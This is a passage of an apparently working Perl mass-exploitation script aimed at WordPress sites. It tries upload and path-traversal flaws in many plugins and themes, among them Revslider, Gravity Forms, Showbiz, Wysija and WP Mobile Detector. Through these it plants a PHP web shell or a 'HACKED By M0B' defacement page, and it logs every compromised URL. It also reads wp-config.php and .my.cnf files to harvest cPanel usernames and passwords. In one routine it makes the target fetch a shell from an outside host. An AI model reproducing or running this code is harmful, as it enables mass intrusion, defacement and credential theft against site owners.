print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $cherryup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$cherryup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Cherry Plugin";

print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}

################ Download Manager #####################
sub downloadsmanager(){
$downloadsmanager[VULNERABLE]="$site/wp-content/plugins/downloads-manager/readme.txt";
my $url = "$site";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [upfile => ["l.php"], dm_upload => '',]);
$dmup="$site/wp-content/plugins/downloads-manager/upload/l.php?X=M0B";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/M0B/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Download Manager";

print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $dmup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$dmup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Download Manager";

print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}


################ Power Zoomer #####################
sub powerzoomer(){ 
my $url = "$site/wp-admin/admin.php?page=powerzoomer_manage";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["l.php"], task => 'pwz_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/powerzoomer\/(.*?)\/big\/l.php/) {
$uploadfolder=$1;
$zoomerup="$site/wp-content/uploads/powerzoomer/$uploadfolder/big/l.php?X=M0B";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Power Zoomer";

print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Power Zoomer";

print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}

################ Gravity Forms #####################
sub gravityforms(){
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres = $ua->post($url, Content_Type => "form-data", Content => [file => ["l.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "css.php.jd"]);

$gravityformsup = "$site/wp-includes/wp-footer.php?X=M0B";
my $check = $ua->get("$site/wp-content/uploads/_input_3_css.php.jd")->content;
my $checkk = $ua->get("$site/wp-includes/wp-footer.php")->content;
if($checkk =~/M0B/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Gravity Forms";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $gravityformsup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$gravityformsup\n";
close (TEXT);
}
else{
gravityforms2();
}
}
################ Gravity Forms #####################
sub gravityforms2(){
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres2 = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["index.jpg"], form_id => '1', name => 'Psyco.html', gform_unique_id => '../../../../../', field_id => '3',]);
$gravityformsupp = "$site/_input_3_Psyco.html";
my $checkgravityformsupp = $ua->get("$gravityformsupp")->content;
if ($checkgravityformsupp =~ /HACKED By/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Gravity Forms";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
print color('bold red'),"Shell Not Uploaded\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
print color('bold white'),"Index Uploaded Successfully\n";
print color('bold white'),"  [Link] => $gravityformsupp\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$gravityformsupp\n";
close (TEXT);

}
else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Gravity Forms";

print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}

################ Revslider upload shell #####################
sub revslider(){

my $url = "$site/wp-admin/admin-ajax.php";

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $revslidres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["rev.zip"]]);

my $revs = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/l.php")->content;
my $revavada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/l.php")->content;
my $revstriking = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/l.php")->content;
my $revincredible = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/l.php")->content;
my $revultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/l.php")->content;
my $revmedicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/l.php")->content;
my $revcentum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/l.php")->content;
my $revbeachapollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/l.php")->content;
my $revcuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/l.php")->content;
my $revpindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/l.php")->content;
my $revdesignplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/l.php")->content;
my $revrarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/l.php")->content;
my $revandre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/l.php")->content;

if($revs =~ /M0B/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revavada =~ /M0B/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}


elsif($revstriking =~ /M0B/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revincredible =~ /M0B/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revmedicate =~ /M0B/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revultimatum =~ /M0B/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revcentum =~ /M0B/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/centum/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revbeachapollo =~ /M0B/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revcuckootap =~ /M0B/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revpindol =~ /M0B/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revdesignplus =~ /M0B/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revrarebird =~ /M0B/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revandre =~ /M0B/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Upload Shell";
print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
revsliderajax();
}
}
################ Revslider ajax #####################
sub revsliderajax(){

my $url = "$site/wp-admin/admin-ajax.php";

my $revslidajaxres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_captions_css", data => "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>HACKED By M0B"]);

$revsliderajax = $site . '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';

my $checkrevsajax = $ua->get("$revsliderajax")->content;
if($checkrevsajax =~ /HACKED By/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Dafece Ajax";

print color('bold green'),"[VULNERABLE]";
print color('bold white'),"\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
print color('bold white'),"Defaced Successfully\n";
print color('bold white'),"  [Link] => $revsliderajax\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$revsliderajax\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Dafece Ajax";

print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}

sub getconfig{
$url = "$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Get Config";

print color('bold green'),"[VULNERABLE]\n";
     open(save, '>>Result/Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
    getcpconfig();
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Get Config";

print color('bold red'),"[FAILED]\n";
}
}

sub getcpconfig{
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Get cPanel";

print color('bold green'),"[VULNERABLE]\n";

$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){

print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"URL : $site/cpanel\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"USER : $1\n";
open (TEXT, '>>Result/cPanel.txt');
print TEXT "Url : $site\n";
print TEXT "USER : $1\n";
close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
            print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"PASS : $1\n";
open (TEXT, '>>Result/cPanel.txt');
print TEXT "PASS : $1\n";
close (TEXT);
        }


}
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Get cPanel";

print color('bold red'),"[FAILED]\n";
}
}

################ Showbiz #####################
sub showbiz(){
my $url = "$url/wp-admin/admin-ajax.php";
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
my $useragent = randomagent();

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent($useragent);
my $showbizres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "showbiz_ajax_action", client_action => "update_plugin", update_file => ["l.php"]]);

$showbizup = $site . '/wp-content/plugins/showbiz/temp/update_extract/l.php?X=M0B';

my $checkshow = $ua->get("$showbizup")->content;
if($checkshow =~ /M0B/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Showbiz";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $showbizup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$showbizup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Showbiz";

print color('bold red'),"[FAILED]\n";
}
}

################ Simple Ads Manager #####################
sub ads(){  
my $url = "$site/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";

my $adsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["l.php"], action => 'upload_ad_image', path => '',]);
$adsup="$site/wp-content/plugins/simple-ads-manager/l.php?X=M0B";
if ($adsres->content =~ /{"status":"success"}/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Simple Ads Manager";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $adsup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$adsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Simple Ads Manager";

print color('bold red'),"[FAILED]\n";
}
}

################ Slide Show Pro #####################
sub slideshowpro(){ 
my $url = "$site/wp-admin/admin.php?page=slideshowpro_manage";

my $slideshowres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["l.php"], task => 'pro_add_new_album', album_name => '', album_desc => '',]);

if ($slideshowres->content =~ /\/uploads\/slideshowpro\/(.*?)\/big\/l.php/) {
$uploadfolder=$1;
$sspup="$site/wp-content/uploads/slideshowpro/$uploadfolder/big/l.php?X=M0B";

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Slide Show Pro";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $sspup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$sspup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Slide Show Pro";

print color('bold red'),"[FAILED]\n";
}
}

################################## WP Mobile Detector ########################################
##############################################################################################
# check the link of the shell or you can upload "wpmobiledetectorshell.zip" on you one shell #
##############################################################################################
sub wpmobiledetector(){ 
$wpmdshell = "http://testatranslations.com/shell/l.php";
$url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
$wpmdup="$site/wp-content/plugins/wp-mobile-detector/cache/l.php?X=M0B";

my $check = $ua->get("$url"); 

my $checkup = $ua->get("$wpmdup")->content; 
if($checkup =~/M0B/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"WP Mobile Detector";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wpmdup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wpmdup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"WP Mobile Detector";

print color('bold red'),"[FAILED]\n";
}
}

################ WYSIJA #####################
sub wysija(){
$theme = "my-theme";
my $url = "$site/wp-admin/admin-post.php?page=wysija_campaigns&action=themes";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


my $wysijares = $ua->post("$url", Content_Type => 'form-data', Content => [ $theme => ['go.zip', => 'go.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);
$wysijaup = "$site/wp-content/uploads/wysija/themes/XAttacker/l.php?X=M0B";
my $checkwysija = $ua->get("$wysijaup")->content;
if($checkwysija =~/M0B/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Wysija";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wysijaup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wysijaup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Wysija";

print color('bold red'),"[FAILED]\n";
}
}

################ InBoundio Marketing #####################
sub inboundiomarketing(){ 
my $url = "$site/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php";
$inbomarketingup = "$site/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/l.php?X=M0B";
my $inbomarketingres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["l.php"],]);

$checkinbomarketing = $ua->get("$inbomarketingup")->content;
if($checkinbomarketing =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"InBoundio Marketing";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $inbomarketingup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$inbomarketingup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"InBoundio Marketing";

print color('bold red'),"[FAILED]\n";
}
}


################ dzs-zoomsounds #####################
sub dzszoomsounds(){ 
my $url = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload.php";
$dzsup = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload/l.php?X=M0B";
my $dzsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file_field => ["l.php"],]);

$checkdzsup = $ua->get("$dzsup")->content;
if($checkdzsup =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"dzs-zoomsounds";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $dzsup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$dzsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"dzs-zoomsounds";

print color('bold red'),"[FAILED]\n";
}
}

################ reflex-gallery #####################/
sub reflexgallery(){ 
my $url = "$site/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=$year&Month=$month";
$reflexup = "$site/wp-content/uploads/$year/$month/l.php?X=M0B";
my $reflexres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["l.php"],]);

$checkreflexup = $ua->get("$reflexup")->content;
if($checkreflexup =~/M0B/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Reflex Gallery";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $reflexup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$reflexup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Reflex Gallery";

print color('bold red'),"[FAILED]\n";
}
}


################ Creative Contact Form #####################
sub sexycontactform(){ 
my $url = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php";
$sexycontactup = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/files/l.php?X=M0B";
my $field_name = "files[]";

my $sexycontactres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["l.php"] ]
           
            );

$checksexycontactup = $ua->get("$sexycontactup")->content;
if($checksexycontactup =~/M0B/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Creative Contact Form";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $sexycontactup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$sexycontactup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Creative Contact Form";

print color('bold red'),"[FAILED]\n";
}
}

################ Work The Flow File Upload #####################
sub wtffu(){
my $url = "$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/";
my $shell ="l.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wtffup="$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/l.php?X=M0B";

$checkwtffup = $ua->get("$wtffup")->content;
if($checkwtffup =~/M0B/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Work The Flow File Upload";

